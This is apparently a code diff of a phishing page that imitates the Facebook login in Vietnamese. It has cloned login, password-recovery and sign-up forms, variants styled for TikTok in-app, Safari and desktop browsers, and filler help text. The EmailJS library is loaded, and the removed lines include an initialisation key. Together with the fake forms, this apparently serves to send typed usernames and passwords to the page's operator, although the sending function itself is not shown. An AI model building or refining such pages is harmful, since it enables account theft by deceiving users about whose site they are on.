@@ -7,261 +7,193 @@
     <meta property="og:title" content="Facebook - Đăng nhập hoặc đăng ký">
     <meta property="og:description" content="Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
-    <meta property="og:url" content="https://www.facebook.com/share/15g8ih73gt/?id=1000789491278365-67ed6976-3c7c-800b-98aa-6ecffbff85b1">
+    <meta property="og:url" content="https://www.facebook.com">
     <meta property="og:type" content="website">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         body {
-            background: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            flex-direction: column;
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: Helvetica, Arial, sans-serif;
-        }
-        .header {
-            width: 100%;
-            padding: 10px 15px;
-            background-color: #f5f6f5;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 1000;
-        }
-        .header.hidden {
-            display: none !important;
-        }
-        .header-content {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            max-width: 400px;
+            flex-direction: column;
+            min-height: 100vh;
+            background: #f0f2f5;
+        }
+        .main-container {
+            flex-grow: 1;
+            padding: 20px;
+            max-width: 100%;
             margin: 0 auto;
-        }
-        .header-title {
-            font-size: 18px;
-            font-weight: bold;
-            color: #1c1e21;
             text-align: center;
-            flex: 1;
         }
-        .header-title.small-title {
-            font-size: 14px;
-        }
-        .header-menu {
-            cursor: pointer;
-            position: absolute;
-            right: 0;
-        }
-        .header-menu svg {
-            width: 24px;
-            height: 24px;
-        }
-        .dropdown-menu {
-            display: none;
-            position: absolute;
-            top: 40px;
-            right: 0;
-            background-color: #fff;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
-            z-index: 1001;
-            width: 200px;
-        }
-        .dropdown-menu.active {
-            display: block;
-        }
-        .dropdown-item {
+        .header-container {
             display: flex;
             align-items: center;
-            padding: 10px 15px;
-            font-size: 14px;
-            color: #000;
-            text-align: left;
-            border-bottom: 1px solid #ddd;
-            cursor: pointer;
+            justify-content: center;
+            margin-bottom: 20px;
         }
-        .dropdown-item:last-child {
-            border-bottom: none;
+        .header-container.hidden {
+            display: none;
         }
-        .dropdown-item:hover {
-            background-color: #f0f0f0;
-        }
-        .dropdown-item svg {
-            width: 20px;
-            height: 20px;
+        .facebook-logo {
+            width: 40px;
+            height: 40px;
             margin-right: 10px;
         }
-        .language-border {
-            border-bottom: 1px solid #ddd;
-            margin-top: 5px;
-            margin-bottom: 5px;
-            max-width: 400px;
-            margin-left: auto;
-            margin-right: auto;
+        .facebook-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1877F2;
+            margin-right: 10px;
+        }
+        .open-button {
+            background-color: #42B72A;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 8px 16px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
         }
         .language-text {
             font-size: 12px;
             color: #737373;
-            text-align: center;
-            max-width: 400px;
-            margin: 0 auto;
+            margin-top: 5px;
+            margin-bottom: 20px;
         }
-        .back-button-header {
+        .left-section {
+            display: none;
+            text-align: left;
+            padding: 20px;
+        }
+        .desktop-logo {
+            width: 300px;
+            margin-bottom: 20px;
+        }
+        .slogan {
+            font-size: 24px;
+            color: #1c1e21;
+            line-height: 1.2;
+        }
+        .back-button {
             display: none;
             align-items: center;
             justify-content: flex-start;
             cursor: pointer;
-            font-size: 16px;
-            margin-top: 10px;
-            max-width: 400px;
-            margin-left: auto;
-            margin-right: auto;
+            font-size: 14px;
+            margin-bottom: 20px;
             color: #1c1e21;
         }
-        .back-button-header svg {
+        .back-button svg {
             margin-right: 8px;
         }
-        .gradient-section {
-            position: fixed;
-            top: 70px;
-            left: 0;
-            width: 100%;
-            height: 50%;
-            background: linear-gradient(to bottom, #e6f0fa 0%, #f5f6f5 100%);
-            z-index: 0;
-        }
-        .login-container, .forgot-password-container, .forgot-password-email-container, .create-account-container, 
-        .about-container, .help-container, .more-container {
-            width: 100%;
-            max-width: 400px;
-            background: transparent;
-            padding: 20px;
-            margin-top: 100px;
-            text-align: left;
-            position: relative;
-            z-index: 1;
-            display: none;
-        }
-        .login-container.active {
-            display: block;
+        .login-container-tiktok, .login-container-desktop, .login-container-safari,
+        .forgot-password-container, .forgot-password-email-container, .create-account-container,
+        .about-container, .help-container, .more-container, .meta-container, .careers-container,
+        .history-container, .forgot-password-help-container, .security-container, 
+        .report-content-container, .contact-container, .instagram-container, .messenger-container,
+        .whatsapp-container, .oculus-container, .stories-container, .groups-container,
+        .marketplace-container, .signup-container, .messenger-footer-container, 
+        .facebook-lite-container, .video-container, .places-container, .games-container,
+        .marketplace-footer-container, .meta-pay-container, .meta-store-container, 
+        .meta-quest-container, .ray-ban-meta-container, .instagram-footer-container,
+        .threads-container, .fundraisers-container, .services-container, .voting-info-container,
+        .privacy-policy-container, .privacy-center-container, .groups-footer-container,
+        .create-ad-container, .create-page-container, .developers-container, 
+        .careers-footer-container, .cookies-container, .ad-choices-container, .terms-container,
+        .upload-contacts-container {
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             text-align: center;
+            display: none;
+            margin: 0 auto;
+            max-width: 400px;
         }
-        .forgot-password-container.active, .forgot-password-email-container.active, .create-account-container.active, 
-        .about-container.active, .help-container.active, .more-container.active {
+        .login-container-tiktok.active, .login-container-desktop.active, .login-container-safari.active,
+        .forgot-password-container.active, .forgot-password-email-container.active, 
+        .create-account-container.active, .about-container.active, .help-container.active, 
+        .more-container.active, .meta-container.active, .careers-container.active, 
+        .history-container.active, .forgot-password-help-container.active, .security-container.active, 
+        .report-content-container.active, .contact-container.active, .instagram-container.active, 
+        .messenger-container.active, .whatsapp-container.active, .oculus-container.active, 
+        .stories-container.active, .groups-container.active, .marketplace-container.active,
+        .signup-container.active, .messenger-footer-container.active, .facebook-lite-container.active, 
+        .video-container.active, .places-container.active, .games-container.active, 
+        .marketplace-footer-container.active, .meta-pay-container.active, .meta-store-container.active, 
+        .meta-quest-container.active, .ray-ban-meta-container.active, .instagram-footer-container.active,
+        .threads-container.active, .fundraisers-container.active, .services-container.active, 
+        .voting-info-container.active, .privacy-policy-container.active, .privacy-center-container.active,
+        .groups-footer-container.active, .create-ad-container.active, .create-page-container.active,
+        .developers-container.active, .careers-footer-container.active, .cookies-container.active,
+        .ad-choices-container.active, .terms-container.active, .upload-contacts-container.active {
             display: block;
         }
-        .facebook-logo {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 40px 0;
-        }
-        .facebook-logo img {
-            width: 60px;
-            height: 60px;
-        }
-        .login-container input, .forgot-password-container input, .forgot-password-email-container input, 
-        .create-account-container input {
-            margin-bottom: 15px;
+        input.form-control {
+            margin-bottom: 10px;
             border-radius: 6px;
             width: 100%;
             padding: 12px;
             border: 1px solid #ddd;
             background: #fff;
+            font-size: 14px;
         }
         .btn-primary {
             width: 100%;
             border-radius: 6px;
             padding: 12px;
-            background-color: #1877f2;
-            border-color: #1877f2;
+            background-color: #1877F2;
+            border-color: #1877F2;
             color: white;
             font-weight: bold;
+            font-size: 14px;
         }
         .btn-create-account {
-            background: transparent;
-            color: #1877f2;
-            border: 1px solid #1877f2;
+            background-color: #42B72A;
+            color: white;
+            border: none;
             border-radius: 6px;
-            width: 100%;
-            padding: 12px;
+            padding: 12px 20px;
             font-weight: bold;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 10px;
         }
         .forgot-password {
-            margin-top: 15px;
-            color: #1877f2;
+            margin-top: 10px;
+            color: #1877F2;
             cursor: pointer;
-            font-size: 14px;
-        }
-        .bottom-section {
-            position: fixed;
-            bottom: 30px;
-            width: 100%;
-            max-width: 400px;
-            left: 50%;
-            transform: translateX(-50%);
-            text-align: center;
-            z-index: 1;
-        }
-        .meta-section {
-            color: #737373;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        .meta-section::before {
-            content: "∞ ";
-            font-size: 20px;
-            color: #737373;
-        }
-        .footer-links {
-            position: fixed;
-            bottom: 0px;
-            width: 100%;
-            max-width: 400px;
-            left: 50%;
-            transform: translateX(-50%);
             font-size: 12px;
-            color: #737373;
-            text-align: center;
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            z-index: 1;
         }
-        .footer-links span {
-            color: #737373;
-            text-decoration: none;
-        }
-        .footer-links span:hover {
-            text-decoration: underline;
+        .divider {
+            border-top: 1px solid #ddd;
+            margin: 15px 0;
         }
         .info-text {
-            font-size: 12px;
+            font-size: 10px;
             color: #737373;
             margin-top: 10px;
         }
         .search-by-email, .search-by-phone {
             display: block;
             text-align: center;
-            margin-top: 15px;
-            padding: 10px;
+            margin-top: 10px;
+            padding: 8px;
             background: transparent;
             color: #737373;
             border: 1px solid #ddd;
             border-radius: 6px;
-            font-size: 14px;
+            font-size: 12px;
             cursor: pointer;
         }
         .error-message {
             color: #dc3545;
-            font-size: 14px;
+            font-size: 12px;
             margin-top: 10px;
             display: none;
         }
@@ -277,19 +209,19 @@
             width: 90%;
             max-width: 300px;
             text-align: center;
-            padding: 20px;
+            padding: 15px;
             z-index: 10002;
         }
         .success-popup-title {
             font-size: 16px;
             font-weight: bold;
             color: #1c1e21;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         .success-popup-message {
             font-size: 14px;
             color: #4b4f56;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         .success-popup-button {
             background-color: #1877f2;
@@ -315,13 +247,13 @@
             z-index: 10001;
         }
         .fb-section {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         .fb-section h2 {
-            font-size: 24px;
+            font-size: 20px;
             font-weight: bold;
             color: #1c1e21;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         .fb-section p {
             font-size: 14px;
@@ -331,173 +263,500 @@
         .fb-section a {
             color: #1877f2;
             text-decoration: none;
+            cursor: pointer;
         }
         .fb-section a:hover {
             text-decoration: underline;
         }
         .fb-links {
-            margin-top: 15px;
+            margin-top: 10px;
         }
         .fb-links a {
             display: block;
             font-size: 14px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
+        .footer {
+            background: #f5f6f5;
+            padding: 15px 0;
+            font-size: 10px;
+            color: #737373;
+            text-align: center;
+        }
+        .footer-languages {
+            margin: 0 auto 8px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            justify-content: center;
+        }
+        .footer-languages a {
+            color: #737373;
+            text-decoration: none;
+        }
+        .footer-languages a:hover {
+            text-decoration: underline;
+        }
+        .footer-links {
+            margin: 0 auto 8px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            justify-content: center;
+        }
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-meta {
+            margin: 0 auto;
+            color: #737373;
+        }
+
+        /* TikTok mode */
+        body.tiktok-mode {
+            background: linear-gradient(to bottom, #69C9D0, #EE1D52);
+        }
+        body.tiktok-mode .footer {
+            background: transparent;
+            font-size: 12px;
+        }
+
+        /* Desktop mode */
+        body.desktop-mode .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            max-width: 1200px;
+        }
+        body.desktop-mode .left-section {
+            display: block;
+            flex: 1;
+            max-width: 500px;
+        }
+        body.desktop-mode .login-container-desktop {
+            flex: 1;
+            max-width: 400px;
+            margin-left: 40px;
+        }
+
+        /* Mobile & Safari adjustments */
         @media (max-width: 576px) {
-            .header { padding: 8px 10px; }
-            .header-title { font-size: 16px; }
-            .header-title.small-title { font-size: 12px; }
-            .language-text { font-size: 11px; }
-            .back-button-header { font-size: 14px; }
-            .facebook-logo img { width: 50px; height: 50px; }
-            .login-container, .forgot-password-container, .forgot-password-email-container, .create-account-container, 
-            .about-container, .help-container, .more-container { padding: 15px; margin-top: 80px; }
-            .facebook-logo { margin: 30px 0; }
-            .btn-primary, .btn-create-account { padding: 10px; }
-            .footer-links { gap: 15px; }
-            .bottom-section { bottom: 25px; }
-            .gradient-section { top: 60px; height: 40%; }
-            .fb-section h2 { font-size: 20px; }
+            .main-container {
+                padding: 15px;
+            }
+            .facebook-logo {
+                width: 32px;
+                height: 32px;
+            }
+            .facebook-title {
+                font-size: 20px;
+            }
+            .open-button {
+                padding: 6px 12px;
+                font-size: 12px;
+            }
+            .language-text {
+                font-size: 10px;
+            }
+            input.form-control {
+                padding: 10px;
+                font-size: 12px;
+            }
+            .btn-primary, .btn-create-account {
+                padding: 10px;
+                font-size: 12px;
+            }
+            .forgot-password {
+                font-size: 11px;
+            }
+            .fb-section h2 {
+                font-size: 18px;
+            }
+            .fb-section p {
+                font-size: 12px;
+            }
+            .fb-links a {
+                font-size: 12px;
+            }
         }
     </style>
 </head>
 <body>
-    <script type="text/javascript">
-        (function() {
-            emailjs.init("wF5gWgp1GWyg7q0KY");
-        })();
-    </script>
-
-    <div class="header">
-        <div class="header-content">
-            <div class="header-title" id="header-title">Đăng nhập Facebook | Facebook</div>
-            <div class="header-menu" onclick="toggleDropdown()">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="12" cy="6" r="2" fill="#1c1e21"/>
-                    <circle cx="12" cy="12" r="2" fill="#1c1e21"/>
-                    <circle cx="12" cy="18" r="2" fill="#1c1e21"/>
-                </svg>
-            </div>
-            <div class="dropdown-menu" id="dropdownMenu">
-                <div class="dropdown-item" onclick="alert('Báo cáo đã được gửi!')">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#737373"/>
-                    </svg>
-                    Báo cáo
-                </div>
-                <div class="dropdown-item" onclick="window.open(window.location.href, '_blank')">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M19 19H5V5H12V3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V12H19V19ZM14 3V5H17.59L7.76 14.83L9.17 16.24L19 6.41V10H21V3H14Z" fill="#737373"/>
-                    </svg>
-                    Mở trong trình duyệt
-                </div>
-                <div class="dropdown-item" onclick="navigator.clipboard.writeText(window.location.href).then(() => alert('Liên kết đã được sao chép!'))">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z" fill="#737373"/>
-                    </svg>
-                    Sao chép liên kết
-                </div>
-            </div>
+    <div class="main-container">
+        <div class="header-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
+            <div class="facebook-title">Facebook</div>
+            <button class="open-button" onclick="showLogin()">Mở</button>
         </div>
-        <div class="language-border"></div>
-        <div class="language-text" id="language-text">Tiếng Việt</div>
-        <div class="back-button-header" id="back-button-header" onclick="showLogin()">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <div class="language-text">Tiếng Việt</div>
+        <div class="left-section">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="desktop-logo">
+            <div class="slogan">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</div>
+        </div>
+        <div class="back-button" id="back-button" onclick="goBack()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
             </svg>
             Quay lại
         </div>
-    </div>
-    <div class="gradient-section"></div>
-    <div class="login-container active">
-        <div class="facebook-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <!-- TikTok Login Container -->
+        <div class="login-container-tiktok">
+            <input type="text" id="login-input-tiktok" class="form-control" placeholder="Số di động hoặc email">
+            <input type="password" id="password-tiktok" class="form-control" placeholder="Mật khẩu">
+            <button class="btn btn-primary" onclick="login()">Đăng nhập</button>
+            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
+            <div class="divider"></div>
+            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
         </div>
-        <input type="text" id="login-input" class="form-control" placeholder="Số di động hoặc email">
-        <input type="password" id="password" class="form-control" placeholder="Mật khẩu">
-        <button class="btn btn-primary" onclick="login()">Đăng nhập</button>
-        <p class="text-danger mt-2" id="error-message" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
-        <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</div>
-        <button class="btn btn-create-account mt-2" onclick="showCreateAccount()">Tạo tài khoản mới</button>
-    </div>
-    <div class="forgot-password-container">
-        <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
-        <p>Nhập số di động của bạn</p>
-        <input type="text" id="phone-input" class="form-control" placeholder="Số di động">
-        <p class="info-text">Chúng tôi có thể gửi cho bạn thông báo qua SMS và WhatsApp nhằm mục đích bảo mật và đăng nhập</p>
-        <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
-        <p class="error-message" id="phone-error-message">Không tìm thấy tài khoản. Vui lòng thử lại với email.</p>
-        <a href="#" class="search-by-email" onclick="showForgotPasswordEmail()">Tìm kiếm bằng email</a>
-    </div>
-    <div class="forgot-password-email-container">
-        <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
-        <p>Nhập email của bạn</p>
-        <input type="email" id="email-input" class="form-control" placeholder="Email">
-        <button class="btn btn-primary" onclick="searchByEmail()">Tiếp tục</button>
-        <p class="error-message" id="email-error-message">Không tìm thấy tài khoản. Vui lòng thử lại!</p>
-        <a href="#" class="search-by-phone" onclick="showForgotPassword()">Tìm kiếm bằng số di động</a>
-    </div>
-    <div class="create-account-container">
-        <h5 style="font-weight: bold;">Tạo tài khoản mới</h5>
-        <input type="text" id="firstName" class="form-control" placeholder="Tên">
-        <input type="text" id="lastName" class="form-control" placeholder="Họ">
-        <input type="text" id="phone" class="form-control" placeholder="Số di động">
-        <input type="email" id="email" class="form-control" placeholder="Email">
-        <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
-        <input type="password" id="confirm-password" class="form-control" placeholder="Xác nhận mật khẩu">
-        <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
-        <p class="error-message" id="create-account-error-message">Vui lòng điền đầy đủ thông tin!</p>
-    </div>
-    <div class="about-container">
-        <div class="fb-section">
-            <h2>Giới thiệu về Facebook</h2>
-            <p>Chúng tôi tin rằng mọi người có thể làm được nhiều điều hơn khi ở bên nhau. Sứ mệnh của chúng tôi là mang đến cho bạn sức mạnh để xây dựng cộng đồng và đưa thế giới đến gần nhau hơn.</p>
+        <!-- Desktop Login Container -->
+        <div class="login-container-desktop">
+            <input type="text" id="login-input-desktop" class="form-control" placeholder="Số di động hoặc email">
+            <input type="password" id="password-desktop" class="form-control" placeholder="Mật khẩu">
+            <button class="btn btn-primary" onclick="login()">Đăng nhập</button>
+            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
+            <div class="divider"></div>
+            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
         </div>
-        <div class="fb-section">
-            <h2>Công ty</h2>
-            <p>Facebook là một phần của Meta, tập trung vào việc kết nối con người thông qua công nghệ. Thành lập năm 2004 bởi Mark Zuckerberg.</p>
-            <div class="fb-links">
-                <a href="#">Tìm hiểu thêm về Meta</a>
-                <a href="#">Sự nghiệp tại Facebook</a>
-                <a href="#">Lịch sử của chúng tôi</a>
+        <!-- Safari Login Container -->
+        <div class="login-container-safari">
+            <input type="text" id="login-input-safari" class="form-control" placeholder="Số di động hoặc email">
+            <input type="password" id="password-safari" class="form-control" placeholder="Mật khẩu">
+            <button class="btn btn-primary" onclick="login()">Đăng nhập</button>
+            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
+            <div class="divider"></div>
+            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
+        </div>
+        <div class="forgot-password-container">
+            <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
+            <p>Nhập số di động của bạn</p>
+            <input type="text" id="phone-input" class="form-control" placeholder="Số di động">
+            <p class="info-text">Chúng tôi có thể gửi cho bạn thông báo qua SMS và WhatsApp nhằm mục đích bảo mật và đăng nhập</p>
+            <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
+            <p class="error-message" id="phone-error-message">Không tìm thấy tài khoản. Vui lòng thử lại với email.</p>
+            <a href="#" class="search-by-email" onclick="showForgotPasswordEmail()">Tìm kiếm bằng email</a>
+        </div>
+        <div class="forgot-password-email-container">
+            <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
+            <p>Nhập email của bạn</p>
+            <input type="email" id="email-input" class="form-control" placeholder="Email">
+            <button class="btn btn-primary" onclick="searchByEmail()">Tiếp tục</button>
+            <p class="error-message" id="email-error-message">Không tìm thấy tài khoản. Vui lòng thử lại!</p>
+            <a href="#" class="search-by-phone" onclick="showForgotPassword()">Tìm kiếm bằng số di động</a>
+        </div>
+        <div class="create-account-container">
+            <h5 style="font-weight: bold;">Tạo tài khoản mới</h5>
+            <input type="text" id="firstName" class="form-control" placeholder="Tên">
+            <input type="text" id="lastName" class="form-control" placeholder="Họ">
+            <input type="text" id="phone" class="form-control" placeholder="Số di động">
+            <input type="email" id="email" class="form-control" placeholder="Email">
+            <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
+            <input type="password" id="confirm-password" class="form-control" placeholder="Xác nhận mật khẩu">
+            <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
+            <p class="error-message" id="create-account-error-message">Vui lòng điền đầy đủ thông tin!</p>
+        </div>
+        <div class="about-container">
+            <div class="fb-section">
+                <h2>Giới thiệu về Facebook</h2>
+                <p>Chúng tôi tin rằng mọi người có thể làm được nhiều điều hơn khi ở bên nhau. Sứ mệnh của chúng tôi là mang đến cho bạn sức mạnh để xây dựng cộng đồng và đưa thế giới đến gần nhau hơn.</p>
+            </div>
+            <div class="fb-section">
+                <h2>Công ty</h2>
+                <p>Facebook là một phần của Meta, tập trung vào việc kết nối con người thông qua công nghệ. Thành lập năm 2004 bởi Mark Zuckerberg.</p>
+                <div class="fb-links">
+                    <a onclick="showMeta()">Tìm hiểu thêm về Meta</a>
+                    <a onclick="showCareers()">Sự nghiệp tại Facebook</a>
+                    <a onclick="showHistory()">Lịch sử của chúng tôi</a>
+                </div>
             </div>
         </div>
-    </div>
-    <div class="help-container">
-        <div class="fb-section">
-            <h2>Trợ giúp & Hỗ trợ</h2>
-            <p>Bạn cần trợ giúp? Chúng tôi ở đây để hỗ trợ bạn với bất kỳ vấn đề nào liên quan đến tài khoản, bảo mật, hoặc cách sử dụng Facebook.</p>
-        </div>
-        <div class="fb-section">
-            <h2>Các chủ đề phổ biến</h2>
-            <div class="fb-links">
-                <a href="#">Quên mật khẩu</a>
-                <a href="#">Bảo mật tài khoản</a>
-                <a href="#">Báo cáo nội dung</a>
-                <a href="#">Liên hệ với chúng tôi</a>
+        <div class="meta-container">
+            <div class="fb-section">
+                <h2>Tìm hiểu thêm về Meta</h2>
+                <p>Meta là công ty mẹ của Facebook, Instagram, WhatsApp và nhiều sản phẩm khác, tập trung vào việc phát triển công nghệ để kết nối thế giới.</p>
             </div>
         </div>
-    </div>
-    <div class="more-container">
-        <div class="fb-section">
-            <h2>Xem thêm</h2>
-            <p>Khám phá các sản phẩm, tính năng và dịch vụ khác từ Facebook và Meta.</p>
-        </div>
-        <div class="fb-section">
-            <h2>Sản phẩm</h2>
-            <div class="fb-links">
-                <a href="#">Instagram</a>
-                <a href="#">Messenger</a>
-                <a href="#">WhatsApp</a>
-                <a href="#">Oculus</a>
+        <div class="careers-container">
+            <div class="fb-section">
+                <h2>Sự nghiệp tại Facebook</h2>
+                <p>Tham gia đội ngũ của chúng tôi để tạo ra tác động toàn cầu. Chúng tôi luôn tìm kiếm những tài năng để xây dựng tương lai của công nghệ.</p>
             </div>
         </div>
-        <div class="fb-section">
-            <h2>Tính năng</h2>
-            <div class="fb-links">
-                <a href="#">Stories</a>
-                <a href="#">Groups</a>
-                <a href="#">Marketplace</a>
+        <div class="history-container">
+            <div class="fb-section">
+                <h2>Lịch sử của chúng tôi</h2>
+                <p>Facebook được thành lập vào năm 2004 bởi Mark Zuckerberg và các bạn cùng phòng tại Đại học Harvard. Từ đó, chúng tôi đã phát triển thành một nền tảng toàn cầu với hàng tỷ người dùng.</p>
+            </div>
+        </div>
+        <div class="help-container">
+            <div class="fb-section">
+                <h2>Trợ giúp & Hỗ trợ</h2>
+                <p>Bạn cần trợ giúp? Chúng tôi ở đây để hỗ trợ bạn với bất kỳ vấn đề nào liên quan đến tài khoản, bảo mật, hoặc cách sử dụng Facebook.</p>
+            </div>
+            <div class="fb-section">
+                <h2>Các chủ đề phổ biến</h2>
+                <div class="fb-links">
+                    <a onclick="showForgotPasswordHelp()">Quên mật khẩu</a>
+                    <a onclick="showSecurity()">Bảo mật tài khoản</a>
+                    <a onclick="showReportContent()">Báo cáo nội dung</a>
+                    <a onclick="showContact()">Liên hệ với chúng tôi</a>
+                </div>
+            </div>
+        </div>
+        <div class="forgot-password-help-container">
+            <div class="fb-section">
+                <h2>Quên mật khẩu</h2>
+                <p>Nếu bạn quên mật khẩu, bạn có thể sử dụng số di động hoặc email để khôi phục tài khoản của mình. Nhấn vào "Quên mật khẩu?" trên trang đăng nhập để bắt đầu.</p>
+            </div>
+        </div>
+        <div class="security-container">
+            <div class="fb-section">
+                <h2>Bảo mật tài khoản</h2>
+                <p>Để bảo mật tài khoản, hãy sử dụng mật khẩu mạnh, bật xác thực hai yếu tố, và không chia sẻ thông tin đăng nhập với người khác.</p>
+            </div>
+        </div>
+        <div class="report-content-container">
+            <div class="fb-section">
+                <h2>Báo cáo nội dung</h2>
+                <p>Nếu bạn thấy nội dung không phù hợp, hãy sử dụng tính năng báo cáo để thông báo cho chúng tôi. Chúng tôi sẽ xem xét và xử lý theo chính sách của mình.</p>
+            </div>
+        </div>
+        <div class="contact-container">
+            <div class="fb-section">
+                <h2>Liên hệ với chúng tôi</h2>
+                <p>Bạn có thể liên hệ với chúng tôi qua email hoặc truy cập trung tâm trợ giúp để được hỗ trợ nhanh chóng.</p>
+            </div>
+        </div>
+        <div class="more-container">
+            <div class="fb-section">
+                <h2>Xem thêm</h2>
+                <p>Khám phá các sản phẩm, tính năng và dịch vụ khác từ Facebook và Meta.</p>
+            </div>
+            <div class="fb-section">
+                <h2>Sản phẩm</h2>
+                <div class="fb-links">
+                    <a onclick="showInstagram()">Instagram</a>
+                    <a onclick="showMessenger()">Messenger</a>
+                    <a onclick="showWhatsApp()">WhatsApp</a>
+                    <a onclick="showOculus()">Oculus</a>
+                </div>
+            </div>
+            <div class="fb-section">
+                <h2>Tính năng</h2>
+                <div class="fb-links">
+                    <a onclick="showStories()">Stories</a>
+                    <a onclick="showGroups()">Groups</a>
+                    <a onclick="showMarketplace()">Marketplace</a>
+                </div>
+            </div>
+        </div>
+        <div class="instagram-container">
+            <div class="fb-section">
+                <h2>Instagram</h2>
+                <p>Instagram là nền tảng chia sẻ ảnh và video, nơi bạn có thể kết nối với bạn bè và khám phá những khoảnh khắc đẹp.</p>
+            </div>
+        </div>
+        <div class="messenger-container">
+            <div class="fb-section">
+                <h2>Messenger</h2>
+                <p>Messenger giúp bạn trò chuyện với bạn bè và gia đình qua tin nhắn, cuộc gọi thoại và video.</p>
+            </div>
+        </div>
+        <div class="whatsapp-container">
+            <div class="fb-section">
+                <h2>WhatsApp</h2>
+                <p>WhatsApp là ứng dụng nhắn tin và gọi điện an toàn, được sử dụng rộng rãi trên toàn cầu.</p>
+            </div>
+        </div>
+        <div class="oculus-container">
+            <div class="fb-section">
+                <h2>Oculus</h2>
+                <p>Oculus mang đến trải nghiệm thực tế ảo (VR) đỉnh cao với các thiết bị và trò chơi tiên tiến.</p>
+            </div>
+        </div>
+        <div class="stories-container">
+            <div class="fb-section">
+                <h2>Stories</h2>
+                <p>Stories cho phép bạn chia sẻ những khoảnh khắc hàng ngày, biến mất sau 24 giờ.</p>
+            </div>
+        </div>
+        <div class="groups-container">
+            <div class="fb-section">
+                <h2>Groups</h2>
+                <p>Tham gia các nhóm trên Facebook để kết nối với những người có cùng sở thích và đam mê.</p>
+            </div>
+        </div>
+        <div class="marketplace-container">
+            <div class="fb-section">
+                <h2>Marketplace</h2>
+                <p>Marketplace là nơi bạn có thể mua bán các sản phẩm trong cộng đồng của mình.</p>
+            </div>
+        </div>
+        <div class="signup-container">
+            <div class="fb-section">
